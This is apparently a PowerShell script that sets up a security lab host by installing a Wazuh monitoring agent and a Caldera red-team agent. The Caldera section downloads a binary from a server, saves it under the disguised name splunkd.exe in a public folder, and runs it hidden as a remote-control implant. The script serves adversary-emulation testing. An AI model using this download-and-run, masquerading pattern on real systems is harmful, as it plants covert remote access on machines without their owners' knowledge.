<#
.SYNOPSIS
Target Agent provisioning script (Windows)
.EXAMPLE
.\install_windows_agent.ps1 -WazuhIP "192.168.X.X" -CalderaIP "192.168.Y.Y"
#>
param (
    [Parameter(Mandatory=$true)][string]$WazuhIP,
    [Parameter(Mandatory=$true)][string]$CalderaIP
)

Write-Host "[+] Installing Wazuh Blue Team Agent..." -ForegroundColor Cyan
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.3-1.msi" -OutFile "$env:TEMP\wazuh-agent.msi"
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i $env:TEMP\wazuh-agent.msi /q WAZUH_MANAGER=`"$WazuhIP`" AUTHD_SERVER=`"$WazuhIP`"" -Wait
Start-Service -Name "WazuhSvc"

Write-Host "[+] Installing Caldera Red Team Agent (Sandcat)..." -ForegroundColor Cyan
$server="http://$CalderaIP:8888"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("file","sandcat.go")
$wc.Headers.add("platform","windows")
$data=$wc.DownloadData($url)
$agentPath = "C:\Users\Public\splunkd.exe"
[System.IO.File]::WriteAllBytes($agentPath, $data) | Out-Null
Start-Process -FilePath $agentPath -ArgumentList "-server $server -group red" -WindowStyle Hidden

Write-Host "[`u{2714}] Provisioning completed successfully!" -ForegroundColor Green